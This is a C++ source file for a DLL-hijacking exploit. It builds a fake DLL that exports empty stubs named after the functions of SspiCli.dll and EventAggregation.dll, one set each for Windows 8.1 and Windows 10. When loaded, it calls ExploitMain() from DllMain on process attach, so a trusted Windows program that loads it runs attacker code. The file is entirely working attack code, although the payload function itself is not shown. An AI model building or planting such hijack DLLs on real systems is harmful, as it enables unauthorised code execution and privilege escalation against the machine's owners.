#include "dllexploit.h"

//
// Windows 8.1 -> SspiCli.dll
//
//   000000014005B1C8  LogonUserExExW SspiCli
//
extern "C" __declspec(dllexport) void APIENTRY LogonUserExExW();

//
// Windows 10 -> EventAggregation.dll
//
//   0000000140083728  EaDeleteAggregatedEvent EventAggregation
//   0000000140083730  BriCreateBrokeredEvent EventAggregation
//   0000000140083738  EaCreateAggregatedEvent EventAggregation
//   0000000140083740  BriDeleteBrokeredEvent EventAggregation
//   0000000140083748  EACreateAggregateEvent EventAggregation
//   0000000140083750  EaQueryAggregatedEventParameters EventAggregation
//   0000000140083758  EaFreeAggregatedEventParameters EventAggregation
//   0000000140083760  EADeleteAggregateEvent EventAggregation
//   0000000140083768  EAQueryAggregateEventData EventAggregation
//
extern "C" __declspec(dllexport) void APIENTRY BriCreateBrokeredEvent();
extern "C" __declspec(dllexport) void APIENTRY BriDeleteBrokeredEvent();
extern "C" __declspec(dllexport) void APIENTRY EaCreateAggregatedEvent();
extern "C" __declspec(dllexport) void APIENTRY EACreateAggregateEvent();
extern "C" __declspec(dllexport) void APIENTRY EaQueryAggregatedEventParameters();
extern "C" __declspec(dllexport) void APIENTRY EAQueryAggregateEventData();
extern "C" __declspec(dllexport) void APIENTRY EaFreeAggregatedEventParameters();
extern "C" __declspec(dllexport) void APIENTRY EaDeleteAggregatedEvent();
extern "C" __declspec(dllexport) void APIENTRY EADeleteAggregateEvent();

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        ExploitMain();
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

//
// SspiCli.dll
//
void APIENTRY LogonUserExExW() { }

//
// EventAggregation.dll
//
void APIENTRY BriCreateBrokeredEvent() { }
void APIENTRY BriDeleteBrokeredEvent() { }
void APIENTRY EaCreateAggregatedEvent() { }
void APIENTRY EACreateAggregateEvent() { }
void APIENTRY EaQueryAggregatedEventParameters() { }
void APIENTRY EAQueryAggregateEventData() { }
void APIENTRY EaFreeAggregatedEventParameters() { }
void APIENTRY EaDeleteAggregatedEvent() { }
void APIENTRY EADeleteAggregateEvent() { }
